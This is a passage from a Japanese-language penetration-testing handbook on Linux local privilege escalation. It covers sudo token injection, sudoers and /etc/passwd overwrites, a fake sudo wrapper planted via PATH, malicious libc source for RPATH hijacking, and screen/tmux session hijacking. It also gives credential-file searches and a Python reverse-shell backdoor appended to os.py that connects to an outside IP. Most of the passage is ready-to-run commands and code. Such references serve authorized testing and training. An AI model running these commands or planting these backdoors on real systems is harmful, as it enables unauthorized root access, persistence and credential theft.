（`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を実行するか、`/etc/sysctl.d/10-ptrace.conf` を恒久的に変更して `kernel.yama.ptrace_scope = 0` に設定することで、一時的に `ptrace_scope` を有効化できます）

これらの要件をすべて満たしている場合、[**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject) を使用して **privileges を escalate できます:**

- **first exploit** (`exploit.sh`) は _/tmp_ に `activate_sudo_token` という binary を作成します。これを使用して **session 内の sudo token を activate できます**（root shell が自動的に取得されるわけではないため、`sudo su` を実行してください）:
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **2つ目のexploit**（`exploit_v2.sh`）は、_/tmp_ に **root所有でsetuidが設定された** sh shellを作成します。
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **third exploit**（`exploit_v3.sh`）は、**sudoers file**を作成し、**sudo tokensを永続化して、すべてのユーザーがsudoを使用できるようにします**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

フォルダーまたはフォルダー内に作成されたファイルのいずれかに**書き込み権限**がある場合、[**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) binaryを使用して、**ユーザーとPID用のsudo tokenを作成**できます。\
たとえば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、そのユーザーとしてPID 1234のshellを持っている場合、次の操作を実行すると、パスワードを知らなくても**sudo privilegesを取得**できます。
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers、/etc/sudoers.d

`/etc/sudoers` ファイルと `/etc/sudoers.d` 内のファイルは、誰が `sudo` をどのように使用できるかを設定します。これらのファイルは、**デフォルトでは root ユーザーと root グループのみが読み取れます**。\
**このファイルを** **読み取る** ことができれば、**興味深い情報を入手できる** 可能性があり、いずれかのファイルに **書き込む** ことができれば、**権限を昇格** できます。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込みが可能なら、この権限を悪用できます。
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD向けの`doas`など、`sudo`バイナリの代替手段がいくつかあります。`/etc/doas.conf`の設定を確認することを忘れないでください。
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
`doas`でeditorまたはinterpreterが許可されている場合は、GTFOBins-style escapesを確認します:
```bash
doas vim
:!/bin/sh
```
### Sudo Hijacking

**ユーザーが通常マシンに接続し、権限昇格のために `sudo` を使用している**ことを知っており、そのユーザーコンテキスト内でシェルを取得した場合、**root としてコードを実行してからユーザーのコマンドを実行する新しい sudo executable**を作成できます。その後、ユーザーコンテキストの **$PATH** を変更します（たとえば、`.bash_profile` に新しいパスを追加します）。これにより、ユーザーが sudo を実行したときに、作成した sudo executable が実行されます。

ユーザーが別の shell（bash 以外）を使用している場合は、新しいパスを追加するために別のファイルを変更する必要があります。たとえば、[sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`、`~/.zshrc`、`~/.bash_profile` を変更します。[bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) に別の例があります。

または、次のようなものを実行します：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

ファイル `/etc/ld.so.conf` は、**読み込まれる設定ファイルがどこにあるか**を示します。通常、このファイルには次のパスが含まれています: `include /etc/ld.so.conf.d/*.conf`

これは、`/etc/ld.so.conf.d/*.conf` の設定ファイルが読み込まれることを意味します。これらの設定ファイルは、**ライブラリ**が**検索**される**他のフォルダ**を指します。たとえば、`/etc/ld.so.conf.d/libc.conf` の内容は `/usr/local/lib` です。**これは、システムが `/usr/local/lib` 内でライブラリを検索することを意味します**。

何らかの理由で、**ユーザーが**次のいずれかのパスに対する**書き込み権限を持っている**場合: `/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` 内の設定ファイルで指定された任意のフォルダ、そのユーザーは権限を昇格できる可能性があります。\
次のページで、**この設定ミスを exploit する方法**を確認してください:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib を `/var/tmp/flag15/` にコピーすると、`RPATH` 変数で指定されているため、この場所にあるプログラムによって使用されます。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に、`gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` を使用して、`/var/tmp` に悪意のあるライブラリを作成します。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities は、**利用可能な root 権限の一部をプロセスに提供**します。これにより、root の **権限がより小さく独立した単位に分割**されます。これらの各単位は、プロセスに個別に付与できます。この方法では、権限の完全なセットが縮小され、exploit のリスクが低下します。\
次のページを読んで、**capabilities とその abuse 方法について詳しく学んでください**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Directory permissions

ディレクトリでは、**"execute" bit** により、そのユーザーはフォルダーに "**cd**" できることを意味します。\
**"read" bit** によりユーザーは **files** を **list** でき、**"write" bit** により **files** を **delete** および新しく **create** できることを意味します。

## ACLs

Access Control Lists (ACLs) は、任意アクセス権限における第2のレイヤーを表し、**従来の ugo/rwx permissions を上書き**できます。これらの permissions により、所有者ではなく、またグループにも属していない特定のユーザーに対して rights を許可または拒否できるため、file や directory への access をより細かく制御できます。このレベルの **granularity により、より正確な access management が可能**になります。詳細については[**こちら**](https://linuxconfig.org/how-to-manage-acls-on-linux)を参照してください。

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
システムから特定のACLを持つファイルを**取得**:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### sudoers drop-in における隠れた ACL backdoor

よくある misconfiguration は、`/etc/sudoers.d/` 内の root-owned、mode `440` のファイルが、ACL によって low-priv user への write access も許可しているケースです。
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
`user:alice:rw-` のような記述がある場合、制限された mode bits にもかかわらず、そのユーザーは sudo ルールを追記できます。
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
これは、`ls -l` のみを使ったレビューでは見落としやすいため、影響の大きい ACL persistence/privesc パスです。

## オープンな shell セッション

**古いバージョン**では、別のユーザー（**root**）の **shell** セッションを **hijack** できる場合があります。\
**最新バージョン**では、自分のユーザーの screen セッションにのみ **connect** できます。ただし、**セッション内に興味深い情報**が見つかる可能性があります。

### screen sessions hijacking

**screen セッションを一覧表示**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![screen sessions hijacking - Socket locations (一部のシステムでは、一方が他方のシンボリックリンクとして公開されています): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**セッションにアタッチする**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux セッションの hijacking

これは**古い tmux バージョン**での問題でした。非特権ユーザーとして、root が作成した tmux（v2.1）セッションを hijack することはできませんでした。

**tmux セッションを一覧表示**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Socketの場所（システムによっては、一方がもう一方のsymlinkとして公開されています） - tmux sessions hijacking: tmux -S /tmp/dev sess ls そのsocketを使用して一覧表示し、そのsocketでtmux sessionを開始できます...](<../../images/image (837).png>)

**sessionにAttachする**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
例については **Valentine box from HTB** を参照してください。

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月から2008年5月13日までの間に Debian ベースのシステム（Ubuntu、Kubuntu など）で生成されたすべての SSL および SSH key は、このバグの影響を受けている可能性があります。\
このバグは、これらの OS で新しい ssh key を作成する際に発生します。**可能なバリエーションが 32,768 通りしかなかった**ためです。つまり、すべての可能性を計算でき、**ssh public key があれば対応する private key を検索できます**。計算済みの候補は次の場所で確認できます: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** password authentication を許可するかどうかを指定します。デフォルトは `no` です。
- **PubkeyAuthentication:** public key authentication を許可するかどうかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: password authentication が許可されている場合に、空の password 文字列を持つアカウントへの login を server が許可するかどうかを指定します。デフォルトは `no` です。

### Login control files

これらのファイルは、誰が login できるか、またその方法に影響します。

- **`/etc/nologin`**: 存在する場合、root 以外の login をブロックし、そのメッセージを表示します。
- **`/etc/securetty`**: root が login できる場所を制限します（TTY allowlist）。
- **`/etc/motd`**: login 後に表示される banner（環境やメンテナンスの詳細が leak する可能性があります）。

### PermitRootLogin

root が ssh を使用して login できるかどうかを指定します。デフォルトは `no` です。指定可能な値:

- `yes`: root は password と private key を使用して login できます
- `without-password` または `prohibit-password`: root は private key を使用した場合のみ login できます
- `forced-commands-only`: root は private key を使用し、かつ commands options が指定されている場合のみ login できます
- `no` : 不可

### AuthorizedKeysFile

user authentication に使用できる public keys を含むファイルを指定します。ホームディレクトリに置き換えられる `%h` などの tokens を含めることができます。**absolute paths**（`/` で始まるもの）または **user の home からの relative paths** を指定できます。例:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定により、ユーザー "**testusername**" の **private** key で login を試行すると、ssh はその key の public key と、`/home/testusername/.ssh/authorized_keys` および `/home/testusername/access` にある key を比較します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding を使用すると、**key をサーバー上に残すことなく**（passphrase なしの key も含む）、**ローカルの SSH key を使用**できます。つまり、ssh 経由で **host** に **jump** し、そこから **initial host** にある **key** を **使用して**、別の **host** に **jump** できます。

この option を `$HOME/.ssh.config` に次のように設定する必要があります。
```
Host example.com
ForwardAgent yes
```
`Host` が `*` の場合、ユーザーが別のマシンに移動するたびに、そのホストがキーにアクセスできるため、セキュリティ上の問題になります。

`/etc/ssh_config` ファイルでは、この **options** を**上書き**し、この設定を許可または拒否できます。\
`/etc/sshd_config` ファイルでは、`AllowAgentForwarding` キーワードを使用して ssh-agent forwarding を**許可または拒否**できます（デフォルトは許可）。

環境内で Forward Agent が設定されていることを発見した場合は、以下のページを読んでください。**権限昇格のために悪用できる可能性があります**。


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### プロファイルファイル

`/etc/profile` ファイルおよび `/etc/profile.d/` 配下のファイルは、**ユーザーが新しい shell を実行したときに実行されるスクリプト**です。したがって、これらのいずれかに対して**書き込みまたは変更が可能であれば、権限昇格できます**。
```bash
ls -l /etc/profile /etc/profile.d/
```
もし不審なプロファイルスクリプトが見つかった場合は、**機密情報**がないか確認してください。

### Passwd/Shadow Files

OS によっては、`/etc/passwd` と `/etc/shadow` ファイルが別の名前で使用されている場合や、バックアップが存在する場合があります。そのため、**すべてを見つけ**、ファイルを**読み取れるか確認**して、ファイル内に**hashes があるか**を確認することを推奨します：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、`/etc/passwd`（または同等の）ファイル内に**password hashes**が見つかることがあります。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能な /etc/passwd

まず、以下のいずれかのコマンドでパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
次に、ユーザー `hacker` を追加し、生成されたパスワードを設定します。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `hacker:hacker` を使って `su` コマンドを実行できます。

または、以下の行を使用して、パスワードなしのダミーユーザーを追加できます。\
警告: マシンの現在のセキュリティを低下させる可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注: BSD プラットフォームでは、`/etc/passwd` は `/etc/pwd.db` および `/etc/master.passwd` に配置され、`/etc/shadow` は `/etc/spwd.db` に名前変更されています。

**機密ファイルに書き込み可能か**確認してください。たとえば、**サービス設定ファイル**に書き込めるでしょうか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンで **tomcat** サーバーが稼働しており、**/etc/systemd/ 内の Tomcat サービス設定ファイルを変更できる場合、** 次の行を変更できます：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
次回 tomcat が起動されたときに、あなたの backdoor が実行されます。

### フォルダを確認

次のフォルダには、バックアップや興味深い情報が含まれている可能性があります: **/tmp**、**/var/tmp**、**/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root**（最後のフォルダはおそらく読み取れませんが、試してみてください）
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所にあるファイル/所有ファイル
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 直近数分以内に変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### SQLite DBファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history、.sudo_as_admin_successful、profile、bashrc、httpd.conf、.plan、.htpasswd、.git-credentials、.rhosts、hosts.equiv、Dockerfile、docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH 内のスクリプト/バイナリ**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを読むと、**パスワードを含んでいる可能性のある複数のファイルを検索している**ことがわかります。\
**もう1つの興味深いtool**として、[**LaZagne**](https://github.com/AlessandroZ/LaZagne) も利用できます。これは、Windows、Linux、Mac のローカルコンピューターに保存されている多数のパスワードを取得するための open source application です。

### Logs

Logs を読み取れる場合、**その中から興味深い情報や機密情報を見つけられる可能性があります**。Log の内容が奇妙であればあるほど、おそらく興味深いものになります。\
また、適切に設定されていない（backdoored?）**audit logs**によって、この記事で説明されているように、**audit logs 内にパスワードを記録できる**場合があります: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)。
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**ログを読み取るには**、[**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) **グループが非常に役立ちます。

### シェルファイル
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

**password** という単語を**名前**または**内容**に含むファイルも確認し、ログ内の IP やメールアドレス、ハッシュの正規表現も確認してください。\
これらすべての方法をここで列挙するつもりはありませんが、興味があれば、[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) が実行する最後のチェックを確認できます。

## Writable files

### Python library hijacking

Python スクリプトが**どこから**実行されるかを把握しており、そのフォルダー内に**書き込み可能**、または **Python libraries** を**変更可能**であれば、OS library を変更して backdoor を仕込めます（Python スクリプトが実行される場所に書き込める場合は、os.py library をコピーして貼り付けます）。

**library に backdoor を仕込む**には、os.py library の末尾に次の行を追加します（IP と PORT を変更してください）。
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` の脆弱性により、ログファイルまたはその親ディレクトリへの **write permissions** を持つユーザーが、**privileges** を potentially gain できる場合があります。これは、通常 **root** として実行される `logrotate` を操作して、特に _**/etc/bash_completion.d/**_ のようなディレクトリ内で任意のファイルを実行させられる可能性があるためです。_ /var/log_ だけでなく、ログローテーションが適用されるすべてのディレクトリについて、permissions を確認することが重要です。

> [!TIP]
> この脆弱性は `logrotate` version `3.18.0` 以前に影響します

この脆弱性の詳細については、次のページを参照してください: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。

この脆弱性は [**logrotten**](https://github.com/whotwagner/logrotten) で exploit できます。

この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** と非常によく似ています。そのため、ログを変更できることがわかった場合は、ログを管理しているユーザーを確認し、ログを symlink に置き換えて privileges を escalate できるか確認してください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

何らかの理由で、ユーザーが _/etc/sysconfig/network-scripts_ に **write** 可能な `ifcf-<whatever>` script を作成できる場合、または既存のものを **adjust** できる場合、**system is pwned** です。

ネットワーク scripts は、たとえば _ifcg-eth0_ のようなものがネットワーク接続に使用されます。これらは .INI ファイルとまったく同じ形式に見えます。しかし、Linux 上では Network Manager (dispatcher.d) によって \~sourced\~ されます。

私の場合、これらのネットワーク scripts の `NAME=` attribute は正しく処理されません。name に **white/blank space** が含まれていると、system は **white/blank space の後の部分を実行しようとします**。つまり、最初の blank space より後にある **すべての内容が root として実行されます**。

たとえば: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network と /bin/id の間の空白に注意してください。_)

### **init、init.d、systemd、rc.d**

`/etc/init.d` ディレクトリには、**classic Linux service management system** である System V init（SysVinit）用の **scripts** が格納されています。これらには、サービスを `start`、`stop`、`restart`、場合によっては `reload` するための scripts が含まれています。これらは直接実行することも、`/etc/rc?.d/` にある symbolic links 経由で実行することもできます。Redhat systems における別のパスは `/etc/rc.d/init.d` です。

一方、`/etc/init` は **Upstart** に関連付けられています。これは Ubuntu が導入した、より新しい **service management** であり、service management tasks に configuration files を使用します。Upstart への移行後も、Upstart の compatibility layer により、SysVinit scripts は Upstart configurations と併用されています。

**systemd** は modern initialization and service manager として登場し、on-demand daemon starting、automount management、system state snapshots などの advanced features を提供します。distribution packages 用の `/usr/lib/systemd/` と、administrator modifications 用の `/etc/systemd/system/` に files を整理することで、system administration process を効率化します。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks は通常、syscall を hook して privileged kernel functionality を userspace manager に公開します。manager authentication が弱い場合（FD-order に基づく signature checks や脆弱な password schemes など）、local app が manager になりすまし、すでに root 化された devices 上で root へ privilege escalation できる可能性があります。詳細と exploitation details はこちらを参照してください。


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations の regex-driven service discovery は、process command lines から binary path を抽出し、privileged context で `-v` を付けて実行できます。permissive patterns（例：`\S` の使用）は、writable locations（例：`/tmp/httpd`）に attacker が配置した listeners に match する可能性があり、root としての execution（CWE-426 Untrusted Search Path）につながります。

詳細と、他の discovery/monitoring stacks に適用可能な generalized pattern については、こちらを参照してください。

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation vectors を探すための最良の tool:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** linux と MAC の kernel vulns を Enumerate [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc、zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: cron-executed monitor 用の forged .text_sig payload](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (logs 経由の bash arithmetic injection、overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
